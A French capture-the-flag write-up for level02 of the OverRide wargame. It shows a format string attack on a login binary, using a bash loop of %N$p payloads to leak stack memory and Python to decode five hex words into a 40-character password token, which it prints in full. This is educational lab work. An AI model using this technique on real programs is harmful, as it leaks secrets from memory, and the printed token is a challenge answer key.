
# Level 02


En lançant l'executable a la racine on voit qu'il nous demande un utilisateur et un mots de pass comme dans l'exercice précédant :
```
level02@OverRide:~$ ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: s
--[ Password: s
*****************************************
s does not have access!
level02@OverRide:~$ 
``` 
Quoi que l'on met on nous dit que nous n'avons pas les accès. On peut voir en desasemblant le programme que ce dernier appelle un printf nous allons donc pouvoir faire une format string attack 
```
(gdb) disas main 
[...]
   0x0000000000400a96 <+642>:   lea    -0x70(%rbp),%rax
   0x0000000000400a9a <+646>:   mov    %rax,%rdi
   0x0000000000400a9d <+649>:   mov    $0x0,%eax
   0x0000000000400aa2 <+654>:   callq  0x4006c0 <printf@plt>
[...]
```
On peut voir que le programme appelle la variable directement, nous pouvons donc afficher la stack pour ce faire nous allons utiliser `%p`
```
level02@OverRide:~$ ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: %1p
--[ Password: 
*****************************************
0x7fffffffe500 does not have access!
level02@OverRide:~$ 
```
On à donc la première adresse de la stack, bien, maintenant nous allons automatiser pour afficher les autre :
``` bash
for((i = 1; i < 30; i++)); do echo "$i - %$i\$p" | ./level02 ;done
```
Pour plus de lisibiliter on vas ajouter un grep ppour recupere selement la ligne qui nous interesse : 
```
level02@OverRide:~$  for((i = 1; i < 30; i++)); do echo "$i - %$i\$p" | ./level02 | grep not ;done
[...]
15 - (nil) does not have access!
16 - (nil) does not have access!
17 - (nil) does not have access!
18 - (nil) does not have access!
19 - (nil) does not have access!
20 - 0x100000000 does not have access!
21 - (nil) does not have access!
22 - 0x756e505234376848 does not have access!
23 - 0x45414a3561733951 does not have access!
24 - 0x377a7143574e6758 does not have access!
25 - 0x354a35686e475873 does not have access!
26 - 0x48336750664b394d does not have access!
27 - (nil) does not have access!
28 - 0x383225202d203832 does not have access!
29 - 0x7024 does not have access!
level02@OverRide:~$ 
```
On remarque que il y a 5 valeur qui on l'air particulières. On sait que le token fait 40 caractères, donc on en déduit que nos 5 valeurs trouver dans la stack peuvent correspondre à notre token. Puisque 5 * 8 = 40.
On prend donc toutes ces valeurs et on les passes dans un convertisseur hex to ascii. En utilisant python on obtient :
```
level02@OverRide:~$ python -c 'print "756e505234376848".decode("hex")[::-1]'
Hh74RPnu
level02@OverRide:~$ python -c 'print "45414a3561733951".decode("hex")[::-1]'
Q9sa5JAE
level02@OverRide:~$ python -c 'print "377a7143574e6758".decode("hex")[::-1]'
XgNWCqz7
level02@OverRide:~$ python -c 'print "354a35686e475873".decode("hex")[::-1]'
sXGnh5J5
level02@OverRide:~$ python -c 'print "48336750664b394d".decode("hex")[::-1]'
M9KfPg3H
```
Le `[::-1]` permet de reverse la string, puisqu'elle nous est donnée depuis la stack. Il reste juste a concatener tout ca ce aui nous donne : 
```
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```